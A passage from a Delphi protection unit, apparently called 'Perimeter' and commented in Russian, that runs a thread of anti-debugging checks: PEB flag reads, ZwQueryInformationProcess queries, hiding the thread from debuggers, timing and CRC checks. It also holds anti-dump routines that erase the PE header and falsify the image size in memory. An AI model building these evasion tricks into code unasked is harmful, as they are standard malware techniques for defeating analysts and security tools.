      asm
        mov eax, $FFFFFFFF
        push DebugString
        call OutputDebugString
        mov AsmFunctionValue, eax
      end;

      if AsmFunctionValue = 0 then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.ODS := True;
        EliminateThreat;
      end;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Отключаем поток от отладчика:
    if IsNumberContains(PerimeterSettings.CheckingsType, ZwSIT) then
    begin
      ZwSetInformationThread(GetCurrentThread, ThreadHideFromDebugger, nil, 0);
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // ASM_A:
    if IsNumberContains(PerimeterSettings.CheckingsType, ASM_A) then
    begin
      asm
        mov eax, fs:[30h]
        mov eax, [eax + 2]
        add eax, 65536

        // EAX <> 0 -> PerimeterInfo.DebuggerExists
        mov AsmFunctionValue, eax
      end;

      if AsmFunctionValue <> 0 then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.ASM_A := True;
        EliminateThreat;
      end;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // ASM_B:
    if IsNumberContains(PerimeterSettings.CheckingsType, ASM_B) then
    begin
      asm
        mov eax, fs:[30h]
        mov eax, [eax + 68h]
        and eax, 70h

        // EAX <> 0 -> PerimeterInfo.DebuggerExists
        mov AsmFunctionValue, eax
      end;

      if AsmFunctionValue <> 0 then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.ASM_B := True;
        EliminateThreat;
      end;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // ZwQIP:
    if IsNumberContains(PerimeterSettings.CheckingsType, ZwQIP) then
    begin
      // 1й способ:
      ZwQueryInformationProcess(GetCurrentProcess, ProcessDebugFlags, @NoDebugInherit, SizeOf(NoDebugInherit), nil);
      if not NoDebugInherit then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.ZwQIP := True;
        EliminateThreat;
      end;

      // = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =

      // 2й способ:
      ZwQueryInformationProcess(GetCurrentProcess, ProcessDebugObjectHandle, @DebugObjectHandle, SizeOf(DebugObjectHandle), nil);
      if DebugObjectHandle <> 0 then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.ZwQIP := True;
        EliminateThreat;
      end;


      // = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =

      // 3й способ:
      ZwQueryInformationProcess(GetCurrentProcess, ProcessDebugPort, @DebugPort, SizeOf(DebugPort), nil);
      if DebugPort <> 0 then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.ZwQIP := True;
        EliminateThreat;
      end;
      
    end;


// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // ZwQSI:
    if IsNumberContains(PerimeterSettings.CheckingsType, ZwQSI) then
    begin
      ZwQuerySystemInformation(SystemKernelDebuggerInformation, @KernelDebuggerInfo, SizeOf(KernelDebuggerInfo), nil);
      if KernelDebuggerInfo.DebuggerEnabled and (not KernelDebuggerInfo.DebuggerNotPresent) then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.ZwQIP := True;
        EliminateThreat;
      end;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // ZwClose:
    if IsNumberContains(PerimeterSettings.CheckingsType, ZwClose) then
    begin
      try
        // Пробуем поднять ядерное исключение:
        CloseHandle($3333);
      except
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.ZwClose := True;
        EliminateThreat;
      end;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Засекаем время:
    QueryPerformanceCounter(T2);
    PerimeterInfo.ElapsedTime := (T2 - T1) / iCounterPerSec;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Проверяем на брейкпоинты:
    PerimeterInfo.BreakpointExists := (PerimeterInfo.ElapsedTime > MaximumRunTime) or EmulateBreakpoint;
    if PerimeterInfo.BreakpointExists and IsNumberContains(PerimeterSettings.CheckingsType, WINAPI_BP) then EliminateThreat;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Внешняя проверка:
    if @PerimeterSettings.OnChecking <> nil then
      if PerimeterSettings.OnChecking(PerimeterInfo) then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.External := True;
        EliminateThreat;
      end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Формируем сообщение об отладчике:
    if PerimeterInfo.DebuggerExists or PerimeterInfo.ROMFailure then
    case EmulateDebugger of
      TRUE:  DebuggerState := DB_EMULATE;
      FALSE: DebuggerState := DB_EXISTS;
    end
    else
      DebuggerState := DB_NOT_EXISTS;

    // Формируем сообщение о брейкпоинте:
    if PerimeterInfo.BreakpointExists then
    case EmulateBreakpoint of
      TRUE:  BreakpointState := BP_EMULATE;
      FALSE: BreakpointState := BP_EXISTS;
    end
    else
      BreakpointState := BP_NOT_EXISTS;

    // Посылаем сообщение:
    PostMessage(PerimeterSettings.MessagesReceiverHandle, PerimeterSettings.MessageNumber, DebuggerState, BreakpointState);

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    Sleep(PerimeterSettings.Interval);
  end;

  FillChar(PerimeterInfo, SizeOf(PerimeterInfo), #0);

  // Посылаем сообщение об остановке Периметра:
  PostMessage(PerimeterSettings.MessagesReceiverHandle, PerimeterSettings.MessageNumber, PM_STOP, PM_STOP);
end;


// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


function StartPerimeter(const PerimeterStartupData: TPerimeterSettings): Boolean;
var
  ThreadID: LongWord;
begin
  Result := False;
  if Active then Exit;

  PerimeterInfo.PrivilegesActivated := False;
{$IFDEF ACTIVATE_DEBUG_PRIVILEGE}
  PerimeterInfo.PrivilegesActivated := PerimeterInfo.PrivilegesActivated or NTSetPrivilege('SeDebugPrivilege');
{$ENDIF}
{$IFDEF ACTIVATE_SHUTDOWN_PRIVILEGE}
  PerimeterInfo.PrivilegesActivated := PerimeterInfo.PrivilegesActivated or NTSetPrivilege('SeShutdownPrivilege');
{$ENDIF}
  PerimeterSettings := PerimeterStartupData;
  if IsNumberContains(PerimeterSettings.CheckingsType, LazyROM) then
    PerimeterCRC := CalculatePerimeterCRC;

  Active := True;
  CloseHandle(BeginThread(nil, 0, @PerimeterThread, nil, 0, ThreadID));
end;


// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


procedure StopPerimeter;
begin
  Active := False;
end;


//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH


function CalculatePerimeterCRC: LongWord;
begin
  Result := CRC32($FFFFFFFF, @PerimeterThread, LongWord(@CalculatePerimeterCRC) - LongWord(@PerimeterThread));
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

function GetPerimeterInfo: TPerimeterInfo;
begin
  Result := PerimeterInfo;
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

function GetPerimeterSettings: TPerimeterSettings;
begin
  Result := PerimeterSettings;
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure SetPerimeterSettings(NewPerimeterSettings: TPerimeterSettings);
begin
  PerimeterSettings := NewPerimeterSettings;
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

function GeneratePerimeterSettings(
                                    CheckingsType: LongWord = ROM or
                                                              LazyROM or
                                                              ASM_A or
                                                              ASM_B or
                                                              IDP or
                                                              RDP or
                                                              WINAPI_BP or
                                                              ZwSIT or
                                                              ZwQIP or
                                                              ZwQSI or
                                                              ZwClose;
                                    ResistanceType: LongWord = Notify;
                                    MessagesReceiverHandle: THandle = 0;
                                    MessageNumber: LongWord = PERIMETER_MESSAGE_NUMBER;
                                    Interval: LongWord = 20
                                   ): TPerimeterSettings;
begin
  FillChar(Result, SizeOf(Result), #0);
  Result.CheckingsType := CheckingsType;
  Result.ResistanceType := ResistanceType;
  Result.MessagesReceiverHandle := MessagesReceiverHandle;
  Result.MessageNumber := PERIMETER_MESSAGE_NUMBER;
  Result.Interval := Interval;
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure ChangeSettings(CheckingsType: LongWord; ResistanceType: LongWord);
begin
  PerimeterSettings.CheckingsType := CheckingsType;
  PerimeterSettings.ResistanceType := ResistanceType;
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure ChangeImageSize(NewSize: LongWord);
asm
  mov eax, fs:[30h]    // PEB
  mov eax, [eax + 0Ch] // PEB_LDR_DATA
  mov eax, [eax + 0Ch] // InOrderModuleList
  mov dword ptr [eax + 20h], NewSize // SizeOfImage
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure Emulate(Debugger: Boolean; Breakpoint: Boolean);
begin
  EmulateDebugger := Debugger;
  EmulateBreakpoint := Breakpoint;
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure ErasePEHeader;
var
  OldProtect: LongWord;
  BaseAddress: Pointer;
begin
  // Получаем базовый адрес модуля:
  BaseAddress := Pointer(GetModuleHandle(nil));

  // Даём памяти права на запись:
  VirtualProtect(BaseAddress, 4096, PAGE_READWRITE, @OldProtect);

  // Чистим заголовок:
  ZeroMemory(BaseAddress, 4096);
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

initialization
  CRCInit;
  Randomize;
  FillChar(PerimeterInfo, SizeOf(PerimeterInfo), #0);
  FillChar(PerimeterSettings, SizeOf(PerimeterSettings), #0);

end.
